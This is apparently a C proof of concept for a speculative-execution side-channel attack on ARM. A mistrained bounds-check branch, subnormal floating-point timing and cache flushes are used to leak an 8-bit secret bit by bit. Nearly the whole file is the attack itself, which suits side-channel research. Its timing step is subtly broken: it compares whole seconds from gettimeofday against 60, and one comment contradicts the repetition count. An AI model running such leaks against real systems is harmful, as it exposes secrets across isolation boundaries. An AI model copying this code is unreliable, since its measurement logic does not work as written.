#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arm_neon.h>
#include "cache.h"
#include "memory.h"
#include <sys/time.h>

// #include <x86intrin.h>
// #include <xmmintrin.h>

#define FAST 0x40f0000000000000
#define SLOW 0x0010deadbeef1337
#define SIZE 256
#define STRIDE 128
// #define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
//#define BARRIER asm volatile("dsb sy;\nisb;\ndmb sy");

//replacement for CLFLUSH
//#define FLUSH_CACHE_LINE(addr) \
{ \
    asm volatile ("dc civac, %0" : : "r" (addr) : "memory"); \
}

//this is the replacement  for __rdtscp
/*
static inline uint64_t READ_CNTVCT_EL0(void) {
    uint64_t val;
    asm volatile("mrs %0, cntvct_el0" : "=r" (val));
    return val;
}
*/

uint64_t global_variable = 0xf;
uint64_t tmp;
unsigned int dummy;
uint64_t start, end;
double value;
static uint8_t array[SIZE * STRIDE] __attribute__((aligned(128)));
uint64_t fast, slow;



double __attribute__((optnone)) victim_function(register int secret, register int bit, int isPublic)
{
  for (volatile int i = 0; i < 200; i++);
  memory_fence();

  if (isPublic < array[0x2 * STRIDE]) {
    uint64_t tmp = ((secret >> bit) & 1) ? 0x40f0000000000000 : 0x0010deadbeef1337;

    // USLH will harden this operation
    volatile double tmp2 = tmp * tmp;
    
    asm volatile (
        // "1: \n"  // Label for the loop start
        ".rept 53\n\t"  // Repeat the following instructions 47 times
        "fsqrt d0, d0\n\t"  // Compute the square root of the double-precision value in d0
        "fmul d0, d0, d0\n\t"  // Multiply the value in d0 by itself
        ".endr\n\t"
    );
    *(volatile uint64_t*)&global_variable;
  }
  return 0;
}


int main(int argc, char *argv[])
{
    volatile double tmp_value1, tmp_value, tmp_value2;
    struct timeval start_time;
    struct timeval end_time;
    
  int secret = atoi(argv[1]);
  int guess = 0;

  memory_fence();

  for (int i = 0; i < sizeof(array); i++)
    array[i] = 0x0;
  array[0x2 * STRIDE] = 10;
  
  memory_fence();
  uint64_t result[8] = {0};

  for (volatile int i = 0; i < 8; i++) {
    tmp_value1 = victim_function(0,0,0);
    tmp_value2 = victim_function(0,0,0);

    memory_fence();
    cache_remove(&array[0x2 * STRIDE]);
    cache_remove(&global_variable);
    memory_fence();

    tmp_value = victim_function(secret, i, 100);

    memory_fence();

    gettimeofday(&start_time, NULL);
    //start = READ_CNTVCT_EL0();
    *(volatile uint8_t*)&global_variable;
    gettimeofday(&end_time, NULL);
    end = (end_time.tv_sec - start_time.tv_sec);
    memory_fence();


    int tmp = end > 60 ? 0 : 1;
    result[i] = end;
    guess = guess | (tmp << i);
    memory_fence();
    asm volatile (".rept 4096;\nnop;\n.endr;");
  }
  memory_fence();
  for (int i = 0; i < 8; i++)
    printf("%3ld ", result[i]);
  printf("Guess : %3d, --> %d\n", guess, guess == secret ? 1 : 0);
}
